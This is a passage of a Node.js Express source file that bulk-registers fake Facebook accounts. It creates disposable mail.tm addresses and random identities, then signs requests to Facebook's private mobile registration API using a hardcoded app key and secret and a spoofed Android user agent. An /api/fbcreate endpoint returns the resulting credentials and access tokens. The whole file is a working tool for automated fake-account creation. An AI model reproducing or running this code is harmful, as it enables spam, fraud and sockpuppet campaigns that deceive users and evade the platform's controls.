        const username = genRandomString(10);
        const password = genRandomString(12);
        const birthday = getRandomDate(new Date(1976, 0, 1), new Date(2004, 0, 1));
        const { firstName, lastName } = getRandomName();
        const url = 'https://api.mail.tm/accounts';
        const data = { address: `${username}@${domain}`, password: password };
        try {
            const response = await axios.post(url, data, { headers: { 'Content-Type': 'application/json' } });
            if (response.status === 201) {
                console.log(`[✓] E-mail Created: ${username}@${domain}`);
                return { email: `${username}@${domain}`, password, firstName, lastName, birthday };
            } else {
                console.error(`[×] Email Error: ${response.data}`);
                return null;
            }
        } catch (error) {
            console.error(`[×] Error: ${error}`);
            return null;
        }
    } else {
        return null;
    }
};

const registerFacebookAccount = async (email, password, firstName, lastName, birthday) => {
    const api_key = '882a8490361da98702bf97a021ddc14d';
    const secret = '62f8ce9f74b12f84c123cc23437a4a32';
    const gender = Math.random() < 0.5 ? 'M' : 'F';
    const req = {
        api_key: api_key,
        attempt_login: true,
        birthday: birthday.toISOString().split('T')[0],
        client_country_code: 'EN',
        fb_api_caller_class: 'com.facebook.registration.protocol.RegisterAccountMethod',
        fb_api_req_friendly_name: 'registerAccount',
        firstname: firstName,
        format: 'json',
        gender: gender,
        lastname: lastName,
        email: email,
        locale: 'en_US',
        method: 'user.register',
        password: password,
        reg_instance: genRandomString(32),
        return_multiple_errors: true
    };
    const sig = Object.keys(req).sort().map(k => `${k}=${req[k]}`).join('') + secret;
    const ensig = crypto.createHash('md5').update(sig).digest('hex');
    req.sig = ensig;

    const api_url = 'https://b-api.facebook.com/method/user.register';
    try {
        const response = await axios.post(api_url, new URLSearchParams(req), {
            headers: { 'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]' }
        });
        const reg = response.data;
        console.log(`Registration Success`);
        return reg;
    } catch (error) {
        console.error(`[×] Registration Error: ${error}`);
        return null;
    }
};

app.post('/api/fbcreate', async (req, res) => {
    const numAccounts = req.query.amount;
    if (!numAccounts || isNaN(numAccounts) || numAccounts <= 0) {
        return res.status(400).json({ error: 'Invalid number of accounts requested' });
    }

    const accounts = [];
    for (let i = 0; i < numAccounts; i++) {
        const account = await createMailTmAccount();
        if (account) {
            const regData = await registerFacebookAccount(account.email, account.password, account.firstName, account.lastName, account.birthday);
            if (regData) {
                accounts.push({
                    email: account.email,
                    password: account.password,
                    firstName: account.firstName,
                    lastName: account.lastName,
                    birthday: account.birthday.toISOString().split('T')[0],
                    gender: regData.gender,
                    userId: regData.new_user_id,
                    token: regData.session_info.access_token
                });
            }
        }
    }

    res.json(accounts);
});


app.listen(port, () => console.log(`App is listening on port ${port}`));
